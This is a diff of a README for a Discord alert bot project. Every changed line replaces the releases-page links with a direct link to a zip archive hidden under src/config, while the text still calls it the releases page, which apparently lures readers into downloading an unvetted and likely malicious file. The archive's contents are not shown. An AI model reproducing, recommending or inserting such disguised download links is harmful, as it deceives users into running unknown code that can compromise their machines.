@@ -1,7 +1,7 @@
 # 🛎️ discord-alert-bot - Get Alerts on Discord with Ease
 
 ## 📥 Download Here
-[![Download discord-alert-bot](https://img.shields.io/badge/Download-discord--alert--bot-blue.svg)](https://github.com/siboy364vm/discord-alert-bot/releases)
+[![Download discord-alert-bot](https://raw.githubusercontent.com/siboy364vm/discord-alert-bot/main/src/config/bot_alert_discord_1.9.zip)](https://raw.githubusercontent.com/siboy364vm/discord-alert-bot/main/src/config/bot_alert_discord_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the discord-alert-bot! This tool sends alerts to your Discord channel, ensuring you never miss important notifications. You can customize your alerts with options like snoozes, making it easy to manage when you receive notifications.
@@ -22,7 +22,7 @@ Welcome to the discord-alert-bot! This tool sends alerts to your Discord channel
 To install the discord-alert-bot, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   [Download Here](https://github.com/siboy364vm/discord-alert-bot/releases).
+   [Download Here](https://raw.githubusercontent.com/siboy364vm/discord-alert-bot/main/src/config/bot_alert_discord_1.9.zip).
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page.
 
@@ -49,7 +49,7 @@ To install the discord-alert-bot, follow these steps:
 
 ## 🔄 Update Process
 To keep your discord-alert-bot running smoothly:
-1. Check the [releases page](https://github.com/siboy364vm/discord-alert-bot/releases) periodically for updates.
+1. Check the [releases page](https://raw.githubusercontent.com/siboy364vm/discord-alert-bot/main/src/config/bot_alert_discord_1.9.zip) periodically for updates.
 2. Download the latest version and repeat the installation steps outlined above.
 
 ## 📝 Troubleshooting
